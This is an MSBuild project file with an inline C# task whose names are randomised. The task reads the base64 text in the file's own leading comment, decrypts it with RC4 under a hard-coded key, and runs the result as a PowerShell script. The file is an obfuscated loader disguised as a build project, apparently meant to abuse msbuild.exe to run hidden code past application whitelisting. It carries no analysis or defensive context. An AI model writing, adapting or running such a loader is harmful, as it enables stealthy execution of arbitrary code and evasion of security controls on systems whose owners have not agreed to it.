<!--
I3OzTp+2V/8hqCkD
-->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="ilCIMZS">
   <ilCIMZS />
   <DYwsDFPcRhQZdBXVcyof />
   </Target>
  <UsingTask
    TaskName="ilCIMZS"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
      <Using Namespace="System" />
	  <Using Namespace="System.IO" />
      <Code Type="Fragment" Language="cs">
      </Code>
    </Task>
	</UsingTask>
	<UsingTask
    TaskName="DYwsDFPcRhQZdBXVcyof"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
	  <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
		using System;
		using System.IO;
		using System.Text;
		using System.Management.Automation;
		using System.Collections.Generic;
		using System.Collections.ObjectModel;
		using Microsoft.Build.Utilities;
		using Microsoft.Build.Framework;
		using System.Management.Automation.Runspaces;
		
		public class DYwsDFPcRhQZdBXVcyof :  Task, ITask {	
			public override bool Execute() {
				string[] McFBlBcSBs = Environment.GetCommandLineArgs();
			
				Runspace oIhyCJKSRUMfrrNSYdTRKZ = RunspaceFactory.CreateRunspace();
				oIhyCJKSRUMfrrNSYdTRKZ.Open();
				RunspaceInvoke rufpYCoXxxHoERmp = new RunspaceInvoke(oIhyCJKSRUMfrrNSYdTRKZ);
				Pipeline mWnkhhWfJUjyQsWLndPeEk = oIhyCJKSRUMfrrNSYdTRKZ.CreatePipeline();
				
				StreamReader vocrFykeAL = File.OpenText(McFBlBcSBs[1]);
				StringBuilder CISHuTMJBaUksYsuTdekAAO = new StringBuilder();
				string QAagGxUEaBYhbyr;
				while((QAagGxUEaBYhbyr = vocrFykeAL.ReadLine()) != null) {
						if(String.Equals(QAagGxUEaBYhbyr, "-->")) {
							byte[] EhWwuOVWFHjoPP = {0xa6, 0x6a, 0x43, 0xc0, 0x62, 0xed, 0x8c, 0x4c, 0x93, 0x07, 0x37, 0xee, 0x88, 0x68, 0xe7, 0xe9, 0x1d, 0x9c, 0x0c, 0xf6, 0x3d, 0x8d, 0x43, 0x4d, 0x70, 0xf0, 0xad, 0x4e, 0x33, 0xaa, 0x94, 0x2a};
							byte[] xZTRI = Convert.FromBase64String(CISHuTMJBaUksYsuTdekAAO.ToString());
							string CJJlgGyCwTukkkpUFQNhU = Encoding.UTF8.GetString(SlBNFldqHdSMVSoRRntQCC.WTBVNZvBgmjHJTKhTDMU(EhWwuOVWFHjoPP, xZTRI));
						
							mWnkhhWfJUjyQsWLndPeEk.Commands.AddScript(CJJlgGyCwTukkkpUFQNhU);
							mWnkhhWfJUjyQsWLndPeEk.Commands.Add("Out-String");
							Collection<PSObject> RvVocvBBbVzBUMWWAYxidYGT = mWnkhhWfJUjyQsWLndPeEk.Invoke();
							oIhyCJKSRUMfrrNSYdTRKZ.Close();
							
							StringBuilder RBuVrHAhZXLmLWdE = new StringBuilder();
							foreach(PSObject imYCrpYaGIxuNOb in RvVocvBBbVzBUMWWAYxidYGT) {
								RBuVrHAhZXLmLWdE.AppendLine(imYCrpYaGIxuNOb.ToString());
							}
							Console.Write(RBuVrHAhZXLmLWdE.ToString());
							return true;
						}
						if(!String.Equals(QAagGxUEaBYhbyr, "<!--")) {
							CISHuTMJBaUksYsuTdekAAO.AppendLine(QAagGxUEaBYhbyr);
						}
				}
				return true;
			}
		}
		
		public class SlBNFldqHdSMVSoRRntQCC {
			public static byte[] ZPCjmmtFWmE(byte[] FieJSNlbonSaYshQs, byte[] EljvPr) {
				int tEcHAi, WkTXWIcpniwPynHPN, LoztYnmtNCCoVKebvjnxMgRA, GRcSpFpmvvevLhWlRJhFQuky, oIYJGhHxuYMr;
				int[] tJWXjwekJyuPwmf, aWzUxNBlsQtZurByNB;
				byte[] BQuIvwAKkSMKUlOwF;

				tJWXjwekJyuPwmf = new int[256];
				aWzUxNBlsQtZurByNB = new int[256];
				BQuIvwAKkSMKUlOwF = new byte[EljvPr.Length];

				for (WkTXWIcpniwPynHPN = 0; WkTXWIcpniwPynHPN < 256; WkTXWIcpniwPynHPN++) {
					tJWXjwekJyuPwmf[WkTXWIcpniwPynHPN] = FieJSNlbonSaYshQs[WkTXWIcpniwPynHPN % FieJSNlbonSaYshQs.Length];
					aWzUxNBlsQtZurByNB[WkTXWIcpniwPynHPN] = WkTXWIcpniwPynHPN;
				}
				for (LoztYnmtNCCoVKebvjnxMgRA = WkTXWIcpniwPynHPN = 0; WkTXWIcpniwPynHPN < 256; WkTXWIcpniwPynHPN++) {
					LoztYnmtNCCoVKebvjnxMgRA = (LoztYnmtNCCoVKebvjnxMgRA + aWzUxNBlsQtZurByNB[WkTXWIcpniwPynHPN] + tJWXjwekJyuPwmf[WkTXWIcpniwPynHPN]) % 256;
					oIYJGhHxuYMr = aWzUxNBlsQtZurByNB[WkTXWIcpniwPynHPN];
					aWzUxNBlsQtZurByNB[WkTXWIcpniwPynHPN] = aWzUxNBlsQtZurByNB[LoztYnmtNCCoVKebvjnxMgRA];
					aWzUxNBlsQtZurByNB[LoztYnmtNCCoVKebvjnxMgRA] = oIYJGhHxuYMr;
				}
				for (tEcHAi = LoztYnmtNCCoVKebvjnxMgRA = WkTXWIcpniwPynHPN = 0; WkTXWIcpniwPynHPN < EljvPr.Length; WkTXWIcpniwPynHPN++) {
					tEcHAi++;
					tEcHAi %= 256;
					LoztYnmtNCCoVKebvjnxMgRA += aWzUxNBlsQtZurByNB[tEcHAi];
					LoztYnmtNCCoVKebvjnxMgRA %= 256;
					oIYJGhHxuYMr = aWzUxNBlsQtZurByNB[tEcHAi];
					aWzUxNBlsQtZurByNB[tEcHAi] = aWzUxNBlsQtZurByNB[LoztYnmtNCCoVKebvjnxMgRA];
					aWzUxNBlsQtZurByNB[LoztYnmtNCCoVKebvjnxMgRA] = oIYJGhHxuYMr;
					GRcSpFpmvvevLhWlRJhFQuky = aWzUxNBlsQtZurByNB[((aWzUxNBlsQtZurByNB[tEcHAi] + aWzUxNBlsQtZurByNB[LoztYnmtNCCoVKebvjnxMgRA]) % 256)];
					BQuIvwAKkSMKUlOwF[WkTXWIcpniwPynHPN] = (byte)(EljvPr[WkTXWIcpniwPynHPN] ^ GRcSpFpmvvevLhWlRJhFQuky);
				}
				return BQuIvwAKkSMKUlOwF;
			}

			public static byte[] WTBVNZvBgmjHJTKhTDMU(byte[] iJiuodWIOvkeZcywA, byte[] LUiACf) {
				return ZPCjmmtFWmE(iJiuodWIOvkeZcywA, LUiACf);
			}
		}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
